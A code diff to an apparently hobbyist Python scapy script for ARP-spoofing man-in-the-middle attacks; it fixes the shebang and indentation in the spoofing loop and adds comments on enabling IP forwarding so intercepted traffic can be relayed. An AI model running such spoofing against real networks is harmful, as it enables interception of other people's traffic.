@@ -1,4 +1,10 @@
-#!usr/bin/env/python3
+#!usr/bin/env python3
+
+# how to forward port on linux
+# execute any of the commands below
+# 1. sudo sysctl -w net.ipv4.ip_forward = 1
+# 2. sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+
 
 import scapy.all as sp
 import argparse
@@ -58,7 +64,7 @@ def mitm(target_ip, spoof_ip, args_status):
 	is_attacking = True
 	while is_attacking:
 		try:
-                        spoof(target_ip, spoof_ip, args_status)
+			spoof(target_ip, spoof_ip, args_status)
 			spoof(spoof_ip, target_ip, args_status)
 			packets_sent += 2
 			print('\r[+] Packets sent: ' + str(packets_sent), end='')
